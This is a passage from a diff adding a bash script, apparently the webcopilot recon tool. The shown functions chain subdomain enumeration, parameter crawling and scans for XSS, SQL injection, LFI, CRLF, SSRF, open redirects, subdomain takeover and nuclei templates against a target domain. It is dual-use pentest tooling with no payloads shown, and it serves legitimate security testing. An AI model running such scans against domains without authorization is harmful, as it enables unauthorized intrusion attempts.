+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning is in progress:${NORMAL}${BOLD} Scanning subdomains of ${RED}$domain${NORMAL}\r"
+    sleep 1s
+    subenum
+    sleep 2s
+    active_subenum
+    sleep 2s
+    subfiltering
+    sleep 2s
+    title
+    sleep 1s
+    echo -ne "${NORMAL}${BOLD}${LGREEN}\n[●] Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${WHITE}\t Total: ${GREEN}$(cat subdomains/subdomains.txt 2> /dev/null | wc -l )${WHITE} | Alive: ${GREEN}$(cat subdomains/alivesub.txt 2> /dev/null | wc -l )\n" 
+
+}
+
+crawl(){
+    mkdir -p patterns
+    sleep 2s
+    parammine
+    sleep 2s
+    gfpt
+    sleep 1s   
+}
+
+vulnScan(){ 
+    mkdir -p vulnerabilities
+    mkdir -p nuclei
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning is in progress:${NORMAL}${BOLD} Getting all vulnerabilities of $domain"
+    sleep 2s
+    xss
+    sleep 2s
+    sqli
+    sleep 2s
+    lfi 
+    sleep 2s
+    crlf
+    sleep 2s
+    ssrf 
+    sleep 2s
+    sensitive
+    sleep 2s
+    openredirect
+    sleep 2s
+    takeover
+    sleep 2s
+    nuclei
+    sleep 1s
+    echo -ne "${NORMAL}${BOLD}${LGREEN}\n[●] Vulnerabilities Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${WHITE}\t Check: ${GREEN}$(echo '/vulnerabilities/')\n" 
+}
+
+webcopilot(){
+    subScan 2> /dev/null
+    crawl 2> /dev/null
+    vulnScan 2> /dev/null
+    result
+}
+
+while true
+do 
+    banner
+    info 
+    if [ -z "$onlysub" ];then webcopilot; else subScan; fi
+    exit 1
+done
